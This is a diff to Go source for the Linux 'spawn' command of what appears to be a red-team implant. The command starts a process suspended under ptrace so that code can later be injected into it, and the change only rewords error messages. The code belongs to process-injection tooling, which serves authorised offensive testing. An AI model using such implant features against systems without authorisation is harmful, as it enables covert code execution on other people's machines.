@@ -32,7 +32,7 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	case "process":
 		return spawnSuspendedProcessLinux(params)
 	case "thread":
-		return errorResult("Error: thread mode requires ptrace-inject on Linux (use spawn -mode process + ptrace-inject)")
+		return errorResult("thread mode requires ptrace-inject on Linux (use spawn -mode process + ptrace-inject)")
 	default:
 		return errorf("Unknown mode: %s (use process)", params.Mode)
 	}
@@ -40,7 +40,7 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 
 func spawnSuspendedProcessLinux(params SpawnParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: path is required")
+		return errorResult("path is required")
 	}
 
 	var sb strings.Builder
@@ -63,7 +63,7 @@ func spawnSuspendedProcessLinux(params SpawnParams) structs.CommandResult {
 	defer runtime.UnlockOSThread()
 
 	if err := cmd.Start(); err != nil {
-		return errorf("Error starting process: %v", err)
+		return errorf("starting process: %v", err)
 	}
 
 	pid := cmd.Process.Pid
@@ -71,7 +71,7 @@ func spawnSuspendedProcessLinux(params SpawnParams) structs.CommandResult {
 	var ws syscall.WaitStatus
 	_, err := syscall.Wait4(pid, &ws, syscall.WALL, nil)
 	if err != nil {
-		return errorf("Error waiting for process stop: %v", err)
+		return errorf("waiting for process stop: %v", err)
 	}
 
 	sb.WriteString("[+] Process created and stopped (PTRACE_TRACEME)\n")
